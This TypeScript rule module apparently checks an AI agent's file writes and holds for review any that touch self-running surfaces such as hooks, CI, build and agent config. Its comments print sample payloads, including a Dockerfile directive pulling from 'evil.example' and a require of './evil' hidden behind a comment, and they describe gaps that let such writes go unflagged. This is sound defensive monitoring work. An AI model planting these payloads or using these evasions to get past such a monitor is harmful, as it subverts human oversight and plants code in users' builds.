import type { EffectRecord, PolicyContext, RuleHit } from "../policy-types.js";
import type { Rule } from "./rule.js";
import { canonicalise, isExecSurface } from "../effect-classifier.js";
import { diffManifest, manifestKindOf } from "../dependency-diff.js";

/**
 * The decision table. It is deliberately separate from the classifier: the surface (which paths
 * run themselves) is an enumerable fact about the ecosystem, while the verdict is the one tunable
 * a deployment might reasonably argue about.
 *
 * Every surface reaches `review`. A held turn is contained just as a discarded turn is, while a
 * false positive remains recoverable. The path-only arm still reports every write without a
 * content gate, so this changes severity without narrowing the predicate that contains registry,
 * submodule and hook-repointing attacks with no shell primitive.
 */
export const EXEC_SURFACE_DECISIONS: Readonly<Record<string, "review">> = {
  "exec-surface:vcs-hook": "review",
  "exec-surface:pm-hook": "review",
  "exec-surface:shell-autoload": "review",
  "exec-surface:agent-config": "review",
  "exec-surface:ci": "review",
  "exec-surface:container": "review",
  "exec-surface:build": "review",
  "exec-surface:editor-config": "review",
  "exec-surface:js-config": "review",
};

/**
 * The former discard arm keeps its hit id so before-and-after measurements attribute the same
 * predicate to the same rule. The id names the write it found, not an irreversible verdict.
 */
const UNCONDITIONAL_REVIEW_CLASSES = new Set([
  "exec-surface:vcs-hook",
  "exec-surface:pm-hook",
  "exec-surface:shell-autoload",
  "exec-surface:agent-config",
]);

/**
 * Paths the classifier calls `exec-surface:ci` because they live under `.github/`, and which no
 * runner executes.
 *
 * `.github/` is claimed whole by one pattern in the classifier, which is right for workflows and
 * actions and wrong for the four files GitHub reads as forms and metadata. `labeler.yml` names
 * globs for a labelling action to apply, `ISSUE_TEMPLATE/config.yml` names the buttons on the new
 * issue page, `FUNDING.yml` names sponsor links, and the templates are prose. None of them can
 * carry a command, and a turn that edits one is not touching what runs.
 *
 * `dependabot.yml` is deliberately NOT here even though it looks like a sibling: it names package
 * ecosystems and can name a private registry with credentials, so a change to it changes where
 * dependencies come from. `CODEOWNERS` is not here either, because it decides who has to approve.
 *
 * Deleting any of these is still judged: they are the `guard` class in `effect-classifier.ts` and
 * `guard-file` reads that class independently of this table.
 */
const DECLARATION_ONLY_CI = [
  /^\.github\/labeler\.ya?ml$/,
  /^\.github\/issue_template(\/|$)/,
  /^\.github\/pull_request_template/,
  /^\.github\/funding\.ya?ml$/,
];

function isDeclarationOnly(rawPath: string): boolean {
  const canonical = canonicalise(rawPath);
  return DECLARATION_ONLY_CI.some((pattern) => pattern.test(canonical));
}

export function decisionForClass(cls: string | undefined): "review" | null {
  if (cls === undefined || !isExecSurface(cls)) return null;
  return EXEC_SURFACE_DECISIONS[cls] ?? "review";
}

/**
 * A line that cannot change what runs, in every format the review-class surfaces are written in.
 *
 * `#` is the comment in YAML, Makefiles, Dockerfiles, TOML, ini, shell and Python; `//` opens the
 * comment in JavaScript, TypeScript and JSONC, and a line that is only a block-comment delimiter
 * carries nothing either. A `#` line inside a JSON file (`devcontainer.json`, `.vscode/tasks.json`)
 * is not a comment, it is a syntax error, and it is inert for the same reason: a file the parser
 * rejects runs nothing at all.
 *
 * A bare `*` continuation line is NOT in this set even though it is the middle of every JSDoc
 * block. In YAML a token starting with `*` is an alias, and an alias can pull a whole job
 * definition in from an anchor defined elsewhere in the file. Counting JSDoc continuations as live
 * costs questions; counting a YAML alias as inert would cost a payload.
 */
const INERT_LINE = /^\s*(?:#|\/\/|$)/;

/**
 * The block-comment halves of that set, which CANNOT be prefix matches.
 *
 * `#` and `//` open a comment that runs to end of line, so a prefix match is the correct test for
 * them: nothing after the marker can execute. `/*` and `*\/` are different, and treating them the
 * same way was a hole. MEASURED against the rule itself before this fix, with the control beside it:
 *
 *     /* x *\/ module.exports = require("./evil")   added to vite.config.ts    SILENT
 *     module.exports = require("./evil")           the same line, no prefix    HIT
 *
 * Seven characters of comment in front of a payload bought silence on a config file that every tool
 * in the workspace loads and executes. The docblock above always said "a line that is ONLY a
 * block-comment delimiter", so the prose was right and the regex did not implement it.
 *
 * So a block-comment line is inert in exactly two shapes: a bare delimiter with nothing else on the
 * line, and a complete `/* ... *\/` with nothing outside it. Anything following the close is live.
 */
const BLOCK_DELIMITER_ONLY = /^\s*(?:\/\*|\*\/)\s*$/;
const WHOLE_LINE_BLOCK_COMMENT = /^\s*\/\*(?:(?!\*\/)[\s\S])*\*\/\s*$/;

/**
 * Lines that START with a comment character and are read as instructions anyway.
 *
 * A Dockerfile parser directive is a `#` line: `# syntax=docker/dockerfile:1` chooses the BuildKit
 * frontend IMAGE that will build the file, so `# syntax=evil.example/frontend:latest` on line one
 * makes the build pull and run an attacker's builder. `# escape=` changes how the rest of the file
 * is lexed. A `#!` shebang chooses the interpreter for a script, and `.devcontainer/` scripts are a
 * review-class surface.
 *
 * Neither shape appears anywhere in the corpus, whose benign edits append `# refactor <id>` and
 * whose attacks write whole files, so no replay would have found this. It is here because the
 * "which characters open a comment" axis was swept by hand across the formats the review classes
 * are written in.
 */
const LIVE_COMMENT = /^\s*(?:#!|#\s*(?:syntax|escape)\s*=)/i;

const isInert = (line: string): boolean =>
  !LIVE_COMMENT.test(line) &&
  (INERT_LINE.test(line) || BLOCK_DELIMITER_ONLY.test(line) || WHOLE_LINE_BLOCK_COMMENT.test(line));

const hasLiveLine = (text: string): boolean =>
  text.split("\n").some((line) => line.trim().length > 0 && !isInert(line));

/** The lines the turn took OUT of a file: present before, absent after. */
async function removedLinesOf(path: string, ctx: PolicyContext): Promise<string> {
  const before = await ctx.realContentOf(path).catch(() => null);
  if (before === null) return "";
  // An unreadable file and an emptied one both arrive here as "nothing after", and the difference
  // matters, so they are separated rather than collapsed. Both REPORT, for different reasons.
  const after = await ctx.contentOf(path).catch(() => null);
  // Fail closed. The docblock on changesWhatRuns says a file that cannot be read must be reported,
  // and a silent "" here would have made it pass instead.
  if (after === null) return before;
  // The maximal removal. This line used to `return ""`, which switched the removal detector off at
  // exactly the point where the most had been removed. MEASURED against the rule, with its control:
  //
  //     Makefile truncated to zero bytes                SILENT
  //     Makefile with one `npm audit` line removed      HIT
  //
  // So deleting one line of a build surface was judged and deleting the whole thing was not. Every
  // line was present before and absent after, which is this function's own definition of removed.
  if (after.length === 0) return before;
  const kept = new Set(after.split("\n"));
  return before.split("\n").filter((line) => !kept.has(line)).join("\n");
}

/**
 * Lines on a build surface that `dependency-change` has already judged, in this same turn.
 *
 * `pyproject.toml` and `cargo.toml` are execution surfaces (a build backend, entry points, a
 * `[tool.pytest.ini_options] addopts`) AND package manifests, and the two halves are judged by two
 * rules. Before this, adding one dependency to `examples/aliases/pyproject.toml` produced a
 * `dependency-added` question and an `execution-surface-review` question about the same line: 178
 * of the corpus's benign asks are that one duplicate.
 *
 * The whole file is NOT handed over, because `parseManifest` reads `dependencies`, `requires` and
 * the index urls and returns `scripts: {}` for pyproject. A blanket delegation would leave
 * `[project.scripts] cli = "evil:main"` judged by nothing at all, which is the shape of fix that
 * moves a defect rather than closing it. So the delegation is per LINE and only to a delta the
 * differ actually produced: a changed line counts as answered when its content is the name or the
 * value of a delta `diffManifest` returned for this file. `"-p evilplugin",` added to an `addopts`
 * array matches no delta and still asks.
 */
async function alreadyJudgedByManifestDiff(effect: EffectRecord, ctx: PolicyContext): Promise<Set<string>> {
  const kind = manifestKindOf(effect.path);
  if (kind === null) return new Set();
  const after = await ctx.contentOf(effect.path).catch(() => "");
  if (after.length === 0) return new Set();
  const before = await ctx.realContentOf(effect.path).catch(() => null);
  const judged = new Set<string>();
  for (const delta of diffManifest(kind, before, after)) {
    judged.add(delta.name);
    if (delta.to !== undefined) judged.add(delta.to);
    if (delta.from !== undefined) judged.add(delta.from);
  }
  return judged;
}

/** `  "click>=8.0",` -> `click>=8.0`. Anything else is returned trimmed and unchanged. */
const unquoteEntry = (line: string): string => line.trim().replace(/,\s*$/, "").replace(/^["']|["']$/g, "");

/**
 * Does this MODIFY change what the surface runs, or only what it says?
 *
 * The content-gated classes are ordinary work surfaces, and most edits to them are not executable:
 * a comment, a blank line, a reindent, a licence header. Asking about those spends a reviewer's
 * attention on a diff with nothing in it. So a modify is only reported when the turn added or
 * removed a line that is not inert.
 *
 * Removals count as well as additions, and that is not symmetry for its own sake: deleting the
 * three lines that are a workflow's `npm audit` step is a change to what runs, and `addedLinesOf`
 * cannot see it. Measured on the corpus, gating on additions alone and gating on both give the same
 * number, because the corpus contains no benign turn that removes a CI step. That agreement is a
 * property of the corpus, not evidence the removal half is redundant.
 *
 * Fail closed. A file whose bytes cannot be read on either side yields no evidence that the change
 * was inert, so it is reported.
 */
async function changesWhatRuns(effect: EffectRecord, ctx: PolicyContext): Promise<boolean> {
  if (effect.kind !== "modify") return true;
  const added = await ctx.addedLinesOf(effect.path).catch(() => null);
  if (added === null) return true;
  const removed = await removedLinesOf(effect.path, ctx);
  const live = [...added.split("\n"), ...removed.split("\n")].filter(
    (line) => line.trim().length > 0 && !isInert(line),
  );
  if (live.length === 0) return false;
  const judged = await alreadyJudgedByManifestDiff(effect, ctx);
  if (judged.size === 0) return true;
  return live.some((line) => !judged.has(unquoteEntry(line)));
}

const SCRIPT_EXTENSIONS = [".js", ".cjs", ".mjs", ".ts", ".sh", ".bash", ".py", ".rb", ".pl"];

/**
 * Local files a manifest already runs. `"build": "node scripts/build.js"` makes `scripts/build.js`
 * an execution surface for this workspace even though nothing about its name says so, which is the
 * hole two red-team payloads used: edit the script the manifest runs and leave the manifest alone.
 */
export function manifestReferencedPaths(manifestJson: string): string[] {
  let parsed: unknown;
  try {
    parsed = JSON.parse(manifestJson);
  } catch {
    return [];
  }
  if (typeof parsed !== "object" || parsed === null) return [];
  const scripts = (parsed as { scripts?: unknown }).scripts;
  if (typeof scripts !== "object" || scripts === null) return [];
  const found = new Set<string>();
  for (const body of Object.values(scripts as Record<string, unknown>)) {
    if (typeof body !== "string") continue;
    for (const raw of body.split(/[\s;|&()]+/)) {
      if (raw.length === 0 || raw.startsWith("-")) continue;
      const token = raw.replace(/^['"]|['"]$/g, "").replace(/^\.\//, "");
      if (token.length === 0 || token.includes("://")) continue;
      const looksLocal = token.includes("/") || SCRIPT_EXTENSIONS.some((e) => token.endsWith(e));
      if (!looksLocal) continue;
      found.add(canonicalise(token));
    }
  }
  return [...found];
}

export const execSurfaceRule: Rule = {
  name: "exec-surface",
  summary:
    "A write to a path that runs itself: a VCS or package manager hook, a shell autoload file, agent config, CI, container or build config, or a file this workspace's own package.json already points at.",
  decisions: ["review"],
  hitIds: ["execution-surface-write", "execution-surface-review"],
  async run(effects: EffectRecord[], ctx: PolicyContext): Promise<RuleHit[]> {
    const written = effects.filter((e) => e.kind !== "delete" && e.kind !== "symlink" && e.kind !== "outbound");
    const hits: RuleHit[] = [];
    for (const effect of written) {
      const decision = decisionForClass(effect.effectClass);
      if (decision === null) continue;
      const unconditional = UNCONDITIONAL_REVIEW_CLASSES.has(effect.effectClass ?? "");
      // The path-only arm remains unconditional. Gating it on shell syntax released registry and
      // submodule repoints whose harm is declarative, so the predicate stays intact and only its
      // verdict moves from irreversible destruction to a recoverable hold.
      if (!unconditional) {
        if (isDeclarationOnly(effect.path)) continue;
        if (!(await changesWhatRuns(effect, ctx))) continue;
      }
      hits.push({
        rule: unconditional ? "execution-surface-write" : "execution-surface-review",
        decision,
        path: effect.path,
        detail: effect.effectClass ?? "exec-surface",
      });
    }

    // the dynamic half: what THIS workspace's manifest already runs
    const manifest = await ctx.realContentOf("package.json").catch(() => null);
    if (manifest === null) return hits;
    const referenced = new Set(manifestReferencedPaths(manifest));
    if (referenced.size === 0) return hits;
    for (const effect of written) {
      if (decisionForClass(effect.effectClass) !== null) continue;   // already reported above
      if (!referenced.has(effect.canonicalPath ?? canonicalise(effect.path))) continue;
      if (!(await changesWhatRuns(effect, ctx))) continue;
      hits.push({
        rule: "execution-surface-review",
        decision: "review",
        path: effect.path,
        detail: "manifest-referenced",
      });
    }
    return hits;
  },
};
